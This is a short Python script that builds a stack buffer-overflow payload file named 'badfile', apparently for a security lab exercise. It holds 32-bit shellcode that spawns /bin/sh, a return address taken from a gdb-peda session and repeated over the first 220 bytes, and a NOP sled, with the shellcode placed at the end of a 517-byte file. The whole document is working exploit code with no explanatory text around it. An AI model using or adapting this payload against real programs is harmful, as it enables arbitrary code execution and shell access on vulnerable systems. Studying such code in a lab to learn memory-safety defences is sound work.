#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
   "\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

##  100 < BUFFER_SIZE < 200
#gdb-peda$ p/x &buffer
#$1 = 0xffffc990
A = 0xffffc990
RT = A + 220

#gdb-peda$ p/x 0xffffc990 + 220
#$2 = 0xffffca6c

print(hex(RT)) # 0xffffca6c <-- ff ff ca 6c

str=""

## Spraying technique: fill the content with RT
length = 55 # 220/4
for i in range(length):
  str = str + "6ccaffff"

#print(len(str))

# Fill the content with NOP's
for i in range(297):
  str = str + "90"

# Fill the content
content = bytearray.fromhex(str)
print(len(content))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode


# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
